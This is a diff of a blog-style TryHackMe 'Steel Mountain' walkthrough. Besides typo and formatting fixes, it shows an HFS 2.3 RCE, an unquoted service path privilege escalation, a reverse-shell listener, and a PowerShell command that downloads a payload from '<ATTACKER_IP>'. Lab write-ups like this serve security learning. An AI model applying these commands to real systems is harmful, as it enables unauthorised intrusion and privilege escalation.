@@ -7,7 +7,7 @@ tags: [tryhackme, tutorial]     # TAG names should always be lowercase
 
 
 ## Introduction
-Steel Mountain refers to the data security firm where the protagonist Eliot tried to break into in the TV show Mr. Robot.
+Steel Mountain refers to the data security firm where the protagonist Eliot broke into in the TV show Mr. Robot.
 Opening a browser to this machine shows a simple html website showing a picture of the employee of the month.
 Looking at the source code of the web page we get the answer to the first question: `<img src="/img/BillHarper.png" style="width:200px;height:200px;"/>`
 
@@ -30,7 +30,7 @@ PORT     STATE SERVICE
 5985/tcp open  wsman
 8080/tcp open  http-proxy
 ```
-Checking the other website running on TCP port 8080 reveals what seems to be an web app to browse system files.
+Checking the other website running on TCP port 8080 reveals what seems to be a web app to browse system files.
 The bottom left corner contains server information including a hyperlink [HTTP File Server 2.3](http://www.rejetto.com/hfs/) towards the open source project of the web app.
 
 Searching Exploit-DB shows that HFS version 2.3 is vulnerable (CVE-2014-6287) to RCE.
@@ -85,7 +85,7 @@ The table below shows the order in which the command line will interpret it. Sin
 | C:\Program Files (x86)\Iobit\Advanced.exe | SystemCare\ASCService.exe |	|
 
 Once the payload is written to `C:\Program Files (x86)\Iobit`{: .filepath}, we can start a listener on the attack machine and restart the service:
-```console
+```console?lang=batchfile
 C:\Program Files (x86)\IObit>sc stop AdvancedSystemCareService9
 C:\Program Files (x86)\IObit>sc start AdvancedSystemCareService9
 ```
@@ -118,19 +118,12 @@ listening on [any] 80 ...
 connect to <ATTACK_IP> from (UNKNOWN) <TARGET_IP>  49305
 Microsoft Windows [Version 6.3.9600]
 (c) 2013 Microsoft Corporation. All rights reserved.
-
-C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>whoami
-whoami
-steelmountain\bill
 ```
 
 With the shell working we can download and run the WinPeas binary using PowerShell:
-```console
-C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup> powershell -c Invoke-WebRequest -Uri https://github.com/carlospolop/PEASS-ng/releases/download/20220724/winPEASx86.exe -Outfile "privesc.exe"
+`powershell -c Invoke-WebRequest -Uri https://github.com/carlospolop/PEASS-ng/releases/download/20220724/winPEASx86.exe -Outfile "privesc.exe"`
 
-```
 With the same web server running on the attack machine we can download the same reverse shell payload:
-```console
-powershell -c Invoke-WebRequest -Uri http://<ATTACKER_IP>/Advanced.exe -Outfile "Advanced.exe"
-```
+`powershell -c Invoke-WebRequest -Uri http://<ATTACKER_IP>/Advanced.exe -Outfile "Advanced.exe"`
+
 And repeat the same procedures from the last paragraph to obtain a high privileged shell!
